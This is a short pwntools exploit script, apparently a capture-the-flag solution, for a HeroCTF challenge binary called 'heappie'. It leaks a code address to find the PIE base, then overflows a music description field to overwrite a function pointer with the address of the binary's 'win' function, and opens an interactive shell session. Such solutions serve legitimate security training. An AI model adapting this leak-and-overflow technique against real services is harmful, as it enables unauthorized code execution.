#!/usr/bin/env python3



from pwn import *

#r = process("./heappie")
r = remote("pwn.heroctf.fr",6000)
e = ELF("./heappie")

def add_music(music,title,art,description):
    r.sendlineafter(b">>",b"1")
    r.sendlineafter(b"Do you want to add a sound to the music? (y/n):",music)
    r.sendlineafter(b"Enter music title:",title)
    r.sendlineafter(b"Enter music artist:",art)
    r.sendlineafter(b"Enter music description:",description)

def show_playlist():
    r.sendlineafter(b">>",b"4")

def play_music(index):
    r.sendlineafter(b">>",b"2")
    r.sendlineafter(b"Enter music index:",f"{index}")


add_music(b"y",b"Havana",b"camila",b"Best_Song")
show_playlist()
r.recvuntil(b" (song: ")
leak = int(r.recvline().strip().strip(b")"),16)
if(hex(leak).endswith("7d")):
    pie_base = leak - 0x127d
elif(hex(leak).endswith("b3")):
    pie_base = leak - 0x12b3
else:
    pie_base = leak - 0x12e9
log.info("The pie base of the process is " + hex(pie_base))
add_music(b"y",b"Havana",b"camila",b"A" * 128 + p64(pie_base + e.sym.win))
add_music(b"n",b"Havana",b"camila",b"Best_Song")
play_music(2)
r.interactive()

